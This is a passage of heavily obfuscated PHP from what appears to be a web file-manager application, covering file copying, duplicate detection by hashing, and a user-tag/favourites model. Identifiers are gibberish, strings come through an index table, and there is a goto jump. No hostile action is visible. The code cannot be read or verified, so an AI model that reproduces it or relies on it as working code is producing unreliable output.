$Ñ½£­‚ == REPEAT_SKIP) { continue; } if ($Ñ½£­‚ == REPEAT_REPLACE) { $ËÓé¿¥¦ = $this->sourceInfoCache($šÑ´Ù‚­); $§„Ûªäá = $this->fileHistory($ËÓé¿¥¦, $Í‡•„ş¥[$Û¾³¤”ç[518]], $Í‡•„ş¥[$Û¾³¤”ç[76]]); if ($§„Ûªäá) { $ëÛÄ™Íã[$Û¾³¤”ç[606]][] = $Í‡•„ş¥[$Û¾³¤”ç[518]]; } continue; } else { if ($Ñ½£­‚ == REPEAT_RENAME) { $Í‡•„ş¥[$Û¾³¤”ç[32]] = $this->fileNameAutoCache($äœ÷®ƒ™, $Í‡•„ş¥[$Û¾³¤”ç[32]], $Ñ½£­‚, !1); } } } } if (!$Í‡•„ş¥[$Û¾³¤”ç[462]] && $Í‡•„ş¥[$Û¾³¤”ç[518]] == 0) { continue; } if (!$Í‡•„ş¥[$Û¾³¤”ç[462]] && $Í‡•„ş¥[$Û¾³¤”ç[518]]) { $ëÛÄ™Íã[$Û¾³¤”ç[606]][] = $Í‡•„ş¥[$Û¾³¤”ç[518]]; } $É®³öí«[] = $this->_makeItemData($Í‡•„ş¥, $¯ÒÓ£¥, $Í‡•„ş¥[$Û¾³¤”ç[32]]); } unset($Í‡•„ş¥); if (!empty($É®³öí«)) { $this->addAll($É®³öí«); $this->_childrenListSelect($äœ÷®ƒ™); } $ÏøŞ±šé = $this->_childrenList($äœ÷®ƒ™); $ÏøŞ±šé = array_to_keyvalue($ÏøŞ±šé, $Û¾³¤”ç[32]); foreach ($‚÷Ç¼«¨ as $Í‡•„ş¥) { $ËÓé¿¥¦ = $ÏøŞ±šé[$Í‡•„ş¥[$Û¾³¤”ç[32]]]; $ÜâÙ˜‹ = $ËÓé¿¥¦[$Û¾³¤”ç[181]]; $this->_copyApplyMeta($ËÓé¿¥¦, $ëÛÄ™Íã); if ($Í‡•„ş¥[$Û¾³¤”ç[33]] == $Û¾³¤”ç[75]) { $Í‡•„ş¥[$Û¾³¤”ç[84]] = $ÊÙüìó->getPathInner($Í‡•„ş¥[$Û¾³¤”ç[84]]); $this->_copyChildTo($ÊÙüìó, $Í‡•„ş¥[$Û¾³¤”ç[84]], $ÜâÙ˜‹, $Ñ½£­‚, $ëÛÄ™Íã, $¨ì¼€Ú“); } } } private function _addFiles($’óÚ³±ê, $šëœì›ï, $ı¯­Õ¥) { $ÕÍƒ«Ç¦ =& $_SERVER[Ö†ØøÖ±]; if (!$šëœì›ï || count($šëœì›ï) == 0) { return array(); } $€¢ÏØ…ß = array(); foreach ($šëœì›ï as &$€å»íô³) { Hook::trigger($ÕÍƒ«Ç¦[648], $€å»íô³); $€å»íô³[$ÕÍƒ«Ç¦[84]] = $’óÚ³±ê->getPathInner($€å»íô³[$ÕÍƒ«Ç¦[84]]); $ŒÍ“–À = $’óÚ³±ê->hashSimple($€å»íô³[$ÕÍƒ«Ç¦[84]]); $¯„åë™ = $’óÚ³±ê->hashMd5($€å»íô³[$ÕÍƒ«Ç¦[84]]); if (strlen($¯„åë™) > 10 && !isset($€¢ÏØ…ß[$¯„åë™])) { $€¢ÏØ…ß[$¯„åë™] = array(); } $€å»íô³[$ÕÍƒ«Ç¦[649]] = $ŒÍ“–À; $€å»íô³[$ÕÍƒ«Ç¦[650]] = $¯„åë™; $€¢ÏØ…ß[$¯„åë™][] =& $€å»íô³; if (count($€¢ÏØ…ß[$¯„åë™]) > 1) { $€å»íô³[$ÕÍƒ«Ç¦[647]] = !0; } Hook::trigger($ÕÍƒ«Ç¦[651], $€å»íô³); } unset($€å»íô³); $„Ø½•­ = array($ÕÍƒ«Ç¦[650] => array($ÕÍƒ«Ç¦[7], array_keys($€¢ÏØ…ß))); $Õ±É´Ì = Model($ÕÍƒ«Ç¦[652]); $‹¦¹—× = $Õ±É´Ì->where($„Ø½•­)->select(); $‹¦¹—× = $‹¦¹—× ? $‹¦¹—× : array(); foreach ($‹¦¹—× as $í‰ˆÔ—) { if (!isset($€¢ÏØ…ß[$í‰ˆÔ—[$ÕÍƒ«Ç¦[650]]])) { continue; } $™ÓŸ = $€¢ÏØ…ß[$í‰ˆÔ—[$ÕÍƒ«Ç¦[650]]]; foreach ($™ÓŸ as &$€å»íô³) { $€å»íô³[$ÕÍƒ«Ç¦[518]] = $í‰ˆÔ—[$ÕÍƒ«Ç¦[518]]; $€å»íô³[$ÕÍƒ«Ç¦[647]] = !0; } unset($€å»íô³); } $ùŞª“Ğş = array(); foreach ($šëœì›ï as $Ë–ˆÓØ“) { Hook::trigger($ÕÍƒ«Ç¦[653], $Ë–ˆÓØ“); if (isset($Ë–ˆÓØ“[$ÕÍƒ«Ç¦[647]]) && $Ë–ˆÓØ“[$ÕÍƒ«Ç¦[647]]) { Hook::trigger($ÕÍƒ«Ç¦[654], $Ë–ˆÓØ“); continue; } $²ôöõú¶ = $’óÚ³±ê->getPathInner($Ë–ˆÓØ“[$ÕÍƒ«Ç¦[84]]); $á§‚† = $Õ±É´Ì->addFileMake($²ôöõú¶, $Ë–ˆÓØ“[$ÕÍƒ«Ç¦[76]], $Ë–ˆÓØ“[$ÕÍƒ«Ç¦[649]], $Ë–ˆÓØ“[$ÕÍƒ«Ç¦[650]], $Ë–ˆÓØ“[$ÕÍƒ«Ç¦[32]], $ı¯­Õ¥); Hook::trigger($ÕÍƒ«Ç¦[654], $Ë–ˆÓØ“); if (!is_array($á§‚†)) { continue; } $ùŞª“Ğş[] = $á§‚†; } $Õ±É´Ì->addAll($ùŞª“Ğş); $„Ø½•­ = array($ÕÍƒ«Ç¦[650] => array($ÕÍƒ«Ç¦[7], array_keys($€¢ÏØ…ß))); $‹¦¹—× = $Õ±É´Ì->where($„Ø½•­)->select(); $‹¦¹—× = $‹¦¹—× ? $‹¦¹—× : array(); foreach ($‹¦¹—× as $í‰ˆÔ—) { if (!isset($€¢ÏØ…ß[$í‰ˆÔ—[$ÕÍƒ«Ç¦[650]]])) { continue; } $üŠ¦€ª =& $€¢ÏØ…ß[$í‰ˆÔ—[$ÕÍƒ«Ç¦[650]]]; foreach ($üŠ¦€ª as &$€å»íô³) { $€å»íô³[$ÕÍƒ«Ç¦[518]] = $í‰ˆÔ—[$ÕÍƒ«Ç¦[518]]; } unset($€å»íô³); } $ÑÔËä²† = array(); foreach ($šëœì›ï as $ÍàİÖÏ˜) { $ÑÔËä²†[$ÍàİÖÏ˜[$ÕÍƒ«Ç¦[32]]] = $ÍàİÖÏ˜; } return $ÑÔËä²†; } } define($_SERVER[Ö†ØøÖ±][655], $_SERVER[Ö†ØøÖ±][656]); $kvxczgjoyr = $_SERVER[Ö†ØøÖ±][657]; goto B§¡ó¡òæ¾; B²ó˜„ºº: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($ìŞ¹Å×º) { $’òĞ¬½Ë =& $_SERVER[Ö†ØøÖ±]; return array($’òĞ¬½Ë[2008] => array($’òĞ¬½Ë[2397] . USER_ID, $’òĞ¬½Ë[2009])); } protected function listData() { $ªœßßıó =& $_SERVER[Ö†ØøÖ±]; $Œºì÷· = array($ªœßßıó[1690] => USER_ID, $ªœßßıó[534] => array($ªœßßıó[2012], 0)); $›Ÿ—Ù = $ªœßßıó[2398]; $ØÓœáë  = $this->field($›Ÿ—Ù)->where($Œºì÷·)->order($ªœßßıó[2015])->select(); return $ØÓœáë  ? $ØÓœáë  : array(); } protected function addToTag($âİˆ¶«, $âöä©ö’) { $Éü†¸ôü =& $_SERVER[Ö†ØøÖ±]; if (!Model($Éü†¸ôü[2157])->listData($âöä©ö’)) { return !1; } if (is_numeric($âİˆ¶«)) { $‰ÀæÈê¸ = Model($Éü†¸ôü[878])->pathInfo($âİˆ¶«); if (!$‰ÀæÈê¸) { return !1; } } else { $‰ÀæÈê¸ = IO::infoSimple($âİˆ¶«); if (!$‰ÀæÈê¸) { return !1; } $Š‰ŠŞ½ = $‰ÀæÈê¸[$Éü†¸ôü[32]]; $÷á‹‚åƒ = $‰ÀæÈê¸[$Éü†¸ôü[33]]; if (isset($‰ÀæÈê¸[$Éü†¸ôü[462]])) { $÷á‹‚åƒ = $‰ÀæÈê¸[$Éü†¸ôü[462]] == $Éü†¸ôü[88] ? $Éü†¸ôü[75] : $Éü†¸ôü[214]; } } $¢Öîúş˜ = array($Éü†¸ôü[1690] => USER_ID, $Éü†¸ôü[534] => $âöä©ö’, $Éü†¸ôü[472] => $âİˆ¶«, $Éü†¸ôü[473] => $÷á‹‚åƒ ? $÷á‹‚åƒ : $Éü†¸ôü[467], $Éü†¸ôü[471] => $Š‰ŠŞ½ ? $Š‰ŠŞ½ : $Éü†¸ôü[12], $Éü†¸ôü[1901] => 0); if ($this->where($¢Öîúş˜)->find()) { return !1; } return $this->add($¢Öîúş˜); } protected function removeFromTag($Ò‚…‘ì , $Œì–éõÔ) { $¡Ğç¡Á¸ =& $_SERVER[Ö†ØøÖ±]; if (!Model($¡Ğç¡Á¸[2157])->listData($Œì–éõÔ)) { return !1; } if (is_array($Ò‚…‘ì )) { $Ò‚…‘ì  = array($¡Ğç¡Á¸[7], $Ò‚…‘ì ); } $ºòï¤ = array($¡Ğç¡Á¸[1690] => USER_ID, $¡Ğç¡Á¸[534] => $Œì–éõÔ, $¡Ğç¡Á¸[472] => $Ò‚…‘ì ); return $this->where($ºòï¤)->delete(); } protected function removeByTag($±úÚîäç) { $½°Ùİ´ =& $_SERVER[Ö†ØøÖ±]; if (!$±úÚîäç) { return !1; } $Ä›Ñö”ä = array($½°Ùİ´[1690] => USER_ID, $½°Ùİ´[534] => $±úÚîäç); return $this->where($Ä›Ñö”ä)->delete(); } protected function removeBySource($¿íƒàêÅ) { $å¹É˜¯Ä =& $_SERVER[Ö†ØøÖ±]; if (is_array($¿íƒàêÅ)) { $¿íƒàêÅ = array($å¹É˜¯Ä[7], $¿íƒàêÅ); } $ğõ‰˜ÇÑ = array($å¹É˜¯Ä[1690] => USER_ID, $å¹É˜¯Ä[534] => array($å¹É˜¯Ä[1067], 0), $å¹É˜¯Ä[472] => $¿íƒàêÅ); return $this->where($ğõ‰˜ÇÑ)->delete(); } }